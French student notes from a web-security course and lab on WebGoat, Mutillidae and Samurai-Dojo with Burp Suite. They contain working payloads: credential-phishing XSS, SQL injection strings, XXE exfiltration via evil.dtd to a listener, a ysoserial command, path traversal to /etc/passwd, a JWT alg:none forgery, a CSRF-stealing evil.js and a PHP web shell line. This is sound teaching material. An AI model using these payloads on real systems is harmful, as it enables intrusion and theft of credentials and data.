#<center>Cyber-Sécurité</center>


## Quand mettre en place de la sécurité?
Faites de l'analyse de risque pour déterminer si on fait de la sécurité

Qu'est ce qu'une donnée sensible?
Une adresse mail c'est pas forcement sensible
Il faut se référer au GDPR

Les numéros de carte doivent être sécurisés en toutes circonstances

**Pas de sur-sécurité**, dépense excessivement inutile

On peut créer des analyses statiques qui vont étudier le code pour examiner les infos en dur dans le logiciel, les librairies, les fonctions etc.

https://networkmarketshare.com


## Types d'attaque

### Attaques XSS

XSS: Cross Site Scripting

**XSS stocké**: je vais sur une page web, je post une attaque, a chaque fois que quelqu'un lit mon message attaque

**XSS réfléchie**: Je fais un url avec mon attaque et je le partage, tout le monde a accès a mon attaque

**XSS en dôme**: On injecte quelque chose dans le dôme HTML

### Attaques SQL
**Injection SQL numeric**: Quand le champs que je saisi est numérique, donc je ne joue pas avec les cotes

**Injection SQL String**: je dois jouer avec les cotes, attention sql ajoute une cote au début et a la fin

**Injection SQL Blind**: quand j'ai pas la possibilité d'avoir un retour direct de mon attaque. Je dois trouver un moyen d'avoir un information sur la réussite de mon attaque

### Attaque XXE

XXE: e**X**ternal **X**ML **E**ntity

On vole des données sécurisées en utilisant des failles de configuration dans un parseur XML. On peut attaquer en direct, ou en utilisant un fichier *.dtd*.


### Attaque CSRF

**C**ross **S**ite **R**equest **F**orgery

Mon objectif est de profité de sa connexion sur le serveur web d'administration pour prendre le contrôle.

Problème il existe des Anti-CSRF Token, chaque fois que le browser accède a la page il récupère un token. Si le site veut re-communiquer avec le serveur il doit re-présenter ce token.  
Si je suis capable de récupérer ce token, je passe pour une requête légitime


### Attaque par Déserialisation

On récupère les informations de fragilité de sérialisation avec le Deserializer Scanner. On ajoute notre attaque sérialisé dans un token a fournir, lors de la déserialisation ce token va attaquer le système.

### Attaque par Contrôle d’accès

On cherche des erreurs de contrôle d’accès, d'élévation de privilège et de gestion de privilèges. On peut accéder a des fichiers sensibles mal protégés, modifier des profils, etc. .


##Modes

###Sniper

Les paramètres, ils vont prendre a tour de rôle les valeurs possibles définis.

###Battering ram

Les paramètres vont prendre la même valeur a chaque essai.

###Pitchfork

Si on a 2 paramètres j'ai 2 listes mais ils prennent la même ligne.

###Cluster bomb

Si on a 2 paramètres j'ai 2 listes en faisant toutes les combinaisons.



## TP

Liens des outils:

  - http://192.168.0.1:8081/WebGoat/attack
  - http://192.168.0.1:8080/WebGoat/attack
  - http://192.168.0.1:9090/WebWolf/login



Connexion à: ProxiaAP
mdp: abcdef1234

http://192.168.0.1:8081/WebGoat/attack

Ajouter plug in pour passer par un proxy

Télécharger Burpsuite

### Mise en place

Liens des outils:

  - http://192.168.0.1:8081/WebGoat/attack
  - http://192.168.0.1:8080/WebGoat/attack
  - http://192.168.0.1:9090/WebWolf/login

Accéder au Hot-spot Wi-Fi ProxiaAP:

  - Connexion à: ProxiaAP
  - mdp: abcdef1234  


Configurer un proxy (FoxyProxy)
Dans BurpSuite configurer le proxy et setter l'*Intercerpt is off*

Accéder a l'adresse: http://192.168.0.1:8081/WebGoat/attack
et renseigner webgoat et webgoat pour les username et mdp.  

!!! tip
    Pour enlever les requettes non souhaitées dans Burp il faut clic droit sur une requête a garder, add to scope, puis clic sur filter, show only in-scope...

###XSS

Une fois renseigner le mdp qui est le prénom de l'employé on peut accéder a la barre de recherche.
Dans cette barre de recherche on y rentre un script: `<script>alert(document.cookie);</script>`
Ce script nous permet de renvoyer l'id de la session en cours.

On pourrait aussi renseigner une ligne HTML qui afficherais une image: `<img src="#" onerror="alert('hack');"/>`

Le code suivant permet d'afficher a l'utilisateur qui fait une recherche une erreur et un formulaire. En renseignant son username et son mot de passe l'utilisateur pense se connecter mais on extrait ses identifiants vers notre site web.

```html
Free softwares                    <hr />
<b>Only registered users are allowed to use our search feature to prevent bots</b>
<br></br>
Username:<br><input type="text" name="username"><br>
Password:<br><input type="text" name="password"><br>
<input type="submit" value="Login" 
onclick="window.open('http://http://127.0.0.1:81//?u='+this.form.username.value+'&p='+this.form.password.value);">
```

Pour essayer d'extraire ces données on va commencer par lancer un serveur http avec python `python.exe -m http.server 81`  
!!! Exemple 
    Si on accède maintenant à : http://localhost:81/ on voit sur notre shell une requête:`::ffff:127.0.0.1 - - [23/Oct/2020 09:47:34] "GET / HTTP/1.1" 200 -`  
    Dans la suite on récupérera les identifiants de l'utilisateur leurré via ces requêtes.

### SQL injection
#### Numeric SQL injection

On cherche a récupérer en une seule requête l'ensemble des lignes du tableau.

```yaml
POST /WebGoat/attack?Screen=1767&menu=1200 HTTP/1.1
Host: 192.168.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,fr;q=0.8,fr-FR;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://192.168.0.1:8081
DNT: 1
Authorization: Basic d2ViZ29hdDp3ZWJnb2F0
Connection: close
Referer: http://192.168.0.1:8081/WebGoat/attack?Screen=1767&menu=1200
Cookie: JSESSIONID=811E3CB4496F570511DD69EF18A23D8A
Upgrade-Insecure-Requests: 1

station=101&SUBMIT=Go%21
```

!!! Recette
    Dans BURP on active l'intercept  
    On clique sur *GO!* (le site va rester en chargement)  
    Dans intercept on cherche la bonne requête, on la modifie  
    On clique sur Forward  
    Sur le site la requête a été exécutée  

Dans la requête au dessus, on modifie la dernière ligne:  
`station=101 OR 1=1&SUBMIT=Go%21`.



#### String SQL injection

On a affaire a un formulaire dans lequel on doit renseigner notre nom. On cherche a afficher toutes les lignes de la table user_data.
```yaml
POST /WebGoat/attack?Screen=1758&menu=1200 HTTP/1.1
Host: 192.168.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,fr;q=0.8,fr-FR;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://192.168.0.1:8081
DNT: 1
Authorization: Basic d2ViZ29hdDp3ZWJnb2F0
Connection: close
Referer: http://192.168.0.1:8081/WebGoat/attack?Screen=1758&menu=1200
Cookie: JSESSIONID=811E3CB4496F570511DD69EF18A23D8A
Upgrade-Insecure-Requests: 1

account_name=Your+Name&SUBMIT=Go%21
```

!!! Recette
    Dans BURP on active l'intercept  
    On clique sur *GO!* (le site va rester en chargement)  
    Dans intercept on cherche la bonne requête, on la modifie  
    On clique sur Forward  
    Sur le site la requête a été exécutée  

Dans la requête au dessus, on modifie la dernière ligne:  
`account_name=Your+Name' OR '1'='1&SUBMIT=Go%21`.

Si on retourne sur le site il a chargé, et affiche toute la table

#### Automatisation

On intercepte la requête  
On l'envoi dans l'intruder  
Dans l'onglet *Position* on vient identifier le paramètre a faire changer. On remarque que l'espace a été transformé en un +. Il y a donc un encodage URL.
Il faut ensuite que l'on choisisse le mode d'attaque (Cf. [Modes](#modes)).  
Puis on **Start attack**  
  
#### Blind SQL Injection

On cherche a connaître le nom des tables et des champs.
On sait que la table s'appelle `user_data` et la colonne est `first_name`.
On va chercher par connaître la première lettre du nom. C'est une requête numérique donc on traduit les lettres en code ASCII.
On obtient donc la requête: ` and (select ascii(substring(first_name,§var1§,1)) from user_data where userid=15613)=§var2§`.  

On lance BURP, on intercepte la requête et on la configure dans l'intruder.
On défini les 2 paramètres, on choisi cluster bomb. On défini le premier en nombre de 1 à 5 par pas de 1, puis le second en nombre de 65 à 122 (valeur ASCII) par pas de 1. Enfin dans option on défini le Grep de sorti (*Account number is valid*).  
On lance l'attaque !!


### XXE

#### Attaque en direct

On souhaites exploiter des erreurs de paramétrage dans les parseurs XML.
Pour se faire on intercepte la requête et on change la partie XML en ce qui suit.
```xml
<<?xml version="1.0"?>
  <!DOCTYPE comment [ <!ENTITY rootpath SYSTEM "file:///">]>
    <comment>
      <text>&rootpath;</text>
    </comment>
```
  
On aura en retour: `.dockerenv bin boot dev docker-java-home etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var `.


Le script suivant permet quant à lui d'exfiltrer ces données en créant une variable ou on stocke les données de secret.txt, puis on affiche cette variable.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM 'file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt'>
%remote;
]>
<comment>
  <text>&cat;</text>
</comment>
```

!!! Recette
    Dans BURP on active l'intercept  
    On clique sur *GO!* (le site va rester en chargement)  
    Dans intercept on cherche la bonne requête, on la modifie  
    On clique sur Forward  
    Sur le site la requête a été exécutée  
    

#### Attaque a l'aide d'un fichier

On upload le fichier attack.dtd via WebWolf.  

attack.dtd:
```xml
<?xml version="1.0" encoding="UTF-8"?>
        <!ENTITY cat SYSTEM 'file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt'>
```

Ici on va cherche le fichier attack.dtd et on viens afficher son contenu
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://192.168.0.1:9090/files/louisonsarlinmagnus/attack.dtd">
%remote;
]>
<comment>
  <text>&cat;</text>
</comment>
```

#### Mulillidae

L'outil du TP: [Mulillidae](http://192.168.0.1/mutillidae/index.php?page=xml-validator.php)  
On souhaite a présent extraire les données vers un site externe.

evil.dtd (placé ici: `http://127.0.0.1:81/evil.dtd`)
```xml
<?xml version="1.0" encoding="utf-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:81'>"> #Serveur auquel envoyé les logs avec les données volées
%all;
```

Script renseigné
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=robots.txt"> #Localisation du fichier a voler
<!ENTITY % dtd SYSTEM "http://127.0.0.1:81/evil.dtd"> #Lien ou stocker le .dtd
%dtd;
]>
<company>
  <employee>
    <firstname>Jo</firstname>
    <lastname>Black</lastname>
  </employee>
  <employee>
    <firstname>John</firstname>
    <lastname>Doe</lastname>
  </employee> 
  <employee>
    <firstname>&send;Bob</firstname>
    <lastname>Smith</lastname>
  </employee>
</company>
```

!!! Explications
    On demande via le XML renseigner de stocker robots.txt (encodé) et de stocké dans file  
    Puis de charger notre script evil.dtd sur un server externe  
    Le script evil demande d'envoyé "un log" sur notre serveur local avec les infos du fichier volé  


### Access Control Flaws

#### Déserialization 

`java -Dhibernate5 -jar ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 "touch /tmp/proxia1" | base64 -w0 > webgoat_payload1_touch.txt`

On ouvre un shell dans le dossier LabWebSecu

Ça créer un fichier txt, la ou on est

On copie ce qu'il y a dans le txt dans le site

#### Bypass a Path Based Access Control Scheme

Dans cette partie on cherche a trouver des erreurs de contrôle d’accès, d'élévation de privilège et de gestion de privilèges.

On cherche a accéder au fichier `etc/passwd`, pour ceci on intercepte la commande et on renseigne le chemin voulu `../../../../../../../../../../../../../../etc/passwd` a la place du fichier.  

#### Role Based Access Control
##### Stage 1: Bypass Business Layer Access Control

En interceptant la requête on remarque un `SearchStaff`, si on le remplace par `DeleteStaff` on supprime notre profil.

```yaml
POST /WebGoat/attack?Screen=1056&menu=200 HTTP/1.1
Host: 192.168.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,fr;q=0.8,fr-FR;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://192.168.0.1:8081
DNT: 1
Authorization: Basic d2ViZ29hdDp3ZWJnb2F0
Connection: close
Referer: http://192.168.0.1:8081/WebGoat/attack?Screen=1056&menu=200
Cookie: JSESSIONID=6732ED4B0A81C6C42F7B1D4783A051ED
Upgrade-Insecure-Requests: 1

action=DeleteStaff
```

##### Stage 3: Bypass Data Layer Access Control

Je me connecte en tant que Tom
J'intercept avec Burp la requête *View Profile*
On modifie dans la requête, on forward et on peut voir le salaire du manager de Tom.

!!! Tips
    Dans la page de login, on peut trouver dans le code HTML les id des employés, on peut donc directement cibler un employé.



### Session Management Flaws

#### Spoof an Authentication Cookie

Outil de transformation de String: https://yehg.net/encoding/pce-cached.php

On cherche un faille dans l'authentification.

Premièrement on essaye de se connecter en webgoat/webgoat pour voir ce qu'il se passe.
*Je n'ai rien remarqué dans la requête envoyée. On voit que lorsque la connexion est réussi on affiche "Your identity has been remembered"*.

On remarque que après avoir été identifié on reçoit une requête GET avec un cookie d'authentification. Si on fait reverse et char--. On trouve que le cookie `65432udfqtb` se transforme en `aspect12345`. Si on change aspect par Alice et on refait les étapes char++ puis reverse alors on obtient le cookie d’authentification d'Alice.

#### Hijack a Session

On identifie que a chaque requête le serveur nous renvoi un nouvel identifiant. Je vais donc chercher une logique dans la génération des session id. J'utilise de **Sequencer** dans BURP en ayant enlever le cookie dans la requête.
On analyse les token, on voit que seul les 3, 4 16, 17 et 18 ème nombre du token changent régulièrement.

On en déduit en regardant l'évolution qu'un token ne nous a pas été attribué, donc quelqu'un a obtenu ce token et s'est connecté. Reste plus qu'a deviné le token. Si on a besoin de faire varier quelque chose on peut toujours utiliser l'intruder pour essayer quelques valeurs.


### Authentication Flaws

#### JWT token

##### JWT signing

Outil pour encoder des JWT: https://jwt.io/

On se met en tant que Tom, on essaye de supprimer les votes, dans la requête intercepté on récupère le acces-token. On décode ce token en base64:
`{"alg":"HS512"}.{"iat":1604393476,"admin":"false","user":"Tom}`  
On le modifie en `{"alg":"none"}.{"iat":1604393476,"admin":"true","user":"Tom"}`  
On ré-encode les 2 partie de part et d'autre du point en base64: `eyJhbGciOiJub25lIn0=.eyJpYXQiOjE2MDQzOTM0NzYsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==.`



### CSRF

#### Samurai-Dojo Basic

Samurai-Dojo Basic: http://192.168.0.1:8082

On veut pouvoir poster un commentaire dans le blog

On doit trouver une attaque XSS dans le dôme et vérifier le fonctionnement du token anti-CSRF.

On voit qu'on a accès a beaucoup d'infos dans *Browser Info*.

Si on intercepte quand on fait *Browser Info*, on peut modifier le Host, on met: `<script> alert('hack')</script>`.  
On remarque que le script est exécuté.

Si on intercepte la requête d'un *Blog Entry*, on trouve un `xsrf_token`. 

Injection dans le dôme: *BrowserInfo* -> On prend le *Referee* (par exemple), on le remplace par mon script d'attaque

On remarque qu'il n'y a pas de gestion des paramètres mis dans l'URL et que si on met un # a la place du & avant notre script il n’apparaît pas du côté serveur.

evil.js: http://192.168.0.1:81/evil.js
```js
var myxhrGET = new XMLHttpRequest();
var myuriGET = 'http://192.168.0.1:8082/index.php?page=add-to-your-blog.php&done=byxss'
myxhrGET.onreadystatechange = function() {
    if (myxhrGET.readyState == XMLHttpRequest.DONE) {
        var myresponse = myxhrGET.response;
        var mytoken = myresponse.getElementsByName("xsrf_token")[0].value;
        do_xsrf(mytoken);
    }
}
myxhrGET.open('GET', myuriGET, true);
myxhrGET.responseType = "document";
myxhrGET.send(null);
function do_xsrf(mytoken){
    var myxhrPOST = new XMLHttpRequest();
    myuriPOST = 'http://192.168.0.1:8082/index.php?page=add-to-your-blog.php&done=byxsrf';
    myxhrPOST.open('POST',myuriPOST,true);
    mypayload = 'input=ISEN4EVER&Submit_button=Submit&xsrf_token='+mytoken;
    myxhrPOST.setRequestHeader('Content-type','application/x-www-form-urlencoded');
    myxhrPOST.setRequestHeader('Content-length',mypayload.length);
    myxhrPOST.setRequestHeader('Connection', 'close');
    myxhrPOST.onreadystatechange = function(){
    }
    myxhrPOST.send(mypayload);
    alert("Success...!");
}
```

`<script src ="http://192.168.0.1:81/evil.js"></script>` permet d'exécuter

`http://192.168.0.1:81/index.php?page=browser-info.php#<script src ="http://192.168.0.1:81/evil.js"></script>` permet de faire exécuter la commande a distance.

<?php passthru($_GET['cmd']); ?>



  












## Tips


!!! Plugins
    Dans l'Extender de BURP il est aisément possible d'ajouter des plugins,  
    Notamment le Déserialisation utile pour le TP #deserialization